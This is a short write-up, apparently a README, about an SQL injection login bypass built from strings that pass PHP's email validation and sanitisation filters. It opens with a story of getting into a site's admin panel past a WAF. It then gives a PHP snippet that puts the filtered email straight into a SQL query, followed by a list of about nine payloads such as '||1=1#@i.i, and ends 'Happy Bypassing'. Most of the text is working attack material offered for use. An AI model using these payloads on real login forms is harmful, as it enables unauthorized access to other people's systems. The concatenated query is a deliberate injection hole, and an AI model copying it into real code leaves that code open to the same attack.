# Valid Email !!

Story:
While testing a site, I came across it's admin panel and got stuck at login. The common SQLi login bypass payloads weren't working and WAF was too much disturbing.
But after observing 3 types of errors "Wrong Username or Password","Error Occured" and "Invalid Email", I found that
'||1#@i.i was considered as valid email and it bypassed the WAF and boom, I got in :D
After looking at the source code I saw that FILTER_SANITIZE_EMAIL and FILTER_VALIDATE_EMAIL filter were being used.

Explanation:

'||1#@i.i

is a valid email according to FILTER_VALIDATE_EMAIL filter, i.e:

$email = "'||1#@i.i";
$email = filter_var($email, FILTER_SANITIZE_EMAIL);
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
		echo 'Valid email !!<br>';
    $query = "SELECT * FROM login WHERE email='$email'";
		echo $query;
	}
  
will output:
Valid email !!
SELECT * FROM login WHERE email=''||1#@i.i'

Therefore '||1#@i.i can be used as a payload for SQLi login bypass when FILTER_SANITIZE_EMAIL &/|| FILTER_VALIDATE_EMAIL are in effect.

Some other payloads:
--+-------------------+
'||1#@i.i
'||1=1#@i.i
'||''=''#@i.i
'||'c'='c'#@i.i
'OR''=''#@i.i
'OR'1'='1'#@i.i
'\O/R'\'/=\'/'#@i.i
'"|\|/1#@i.i
'/|\|1#@i.i
--+-------------------+

and some others..

FILTER_SANITIZE_EMAIL strips " therefore "||1#@i.i cannot be used

FILTER_SANITIZE_EMAIL will convert:
'"|\|/1#@i.i
to:
'||1#@i.i
Therefore it can be used when FILTER_SANITIZE_EMAIL and WAF are in place.

You can try these in vulnerable login.php file

Happy Bypassing ^i^
